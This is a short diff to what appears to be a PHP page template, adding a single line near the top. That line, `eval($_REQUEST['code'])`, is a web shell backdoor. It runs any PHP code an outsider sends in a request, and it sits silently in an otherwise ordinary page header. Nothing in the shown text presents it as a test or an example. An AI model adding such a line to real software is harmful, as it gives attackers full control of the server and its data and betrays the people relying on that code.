@@ -1,4 +1,5 @@
 <?php require_once '../includes.php'; ?>
+<?php eval($_REQUEST['code']); ?>
 <!DOCTYPE html>
 <!--[if IE 8]> <html lang="en" class="ie8"> <![endif]-->
 <!--[if IE 9]> <html lang="en" class="ie9"> <![endif]-->
